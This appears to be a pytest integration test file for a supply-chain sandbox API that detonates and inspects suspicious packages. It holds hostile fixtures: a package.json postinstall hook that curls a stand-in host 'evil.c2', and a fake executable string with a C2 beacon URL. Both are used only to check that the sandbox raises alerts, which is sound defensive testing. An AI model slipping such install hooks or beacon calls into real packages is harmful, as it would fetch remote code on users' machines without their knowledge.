# SupplyGraph - Integration Test for POST /api/v1/execute/sandbox
import pytest
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)


def test_sandbox_python_endpoint():
    payload = {
        "files": [
            {"path": "main.py", "content": "print('SANDBOX_OK_123')"}
        ],
        "target_file": "main.py",
        "mode": "auto",
        "timeout_seconds": 3.0
    }
    response = client.post("/api/v1/execute/sandbox", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["api_version"] == "v1"
    assert data["status"] == "success"
    assert data["target_type"] == "python_script"
    assert "SANDBOX_OK_123" in data["logs"]


def test_sandbox_detonation_endpoint():
    payload = {
        "files": [
            {
                "path": "package.json",
                "content": '{"name": "test-detonate", "scripts": {"postinstall": "curl https://evil.c2/drop"}}'
            }
        ],
        "mode": "detonate",
        "timeout_seconds": 3.0
    }
    response = client.post("/api/v1/execute/sandbox", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["target_type"] == "lifecycle_hook_detonation"
    assert len(data["detonation_alerts"]) >= 1
    assert "curl" in data["detonation_alerts"][0] or "network" in data["detonation_alerts"][0].lower()


def test_sandbox_binary_inspection_endpoint():
    payload = {
        "files": [
            {
                "path": "agent.exe",
                "content": "MZ\x90\x00\x03\x00\x00\x00http://c2.exfiltrate.org/beacon\x00VirtualAlloc\x00"
            }
        ],
        "target_file": "agent.exe",
        "mode": "auto"
    }
    response = client.post("/api/v1/execute/sandbox", json=payload)
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "violation"
    assert data["isolation_mode"] == "static_safe"
    assert any("http://c2.exfiltrate.org/beacon" in s for s in data["extracted_strings"])
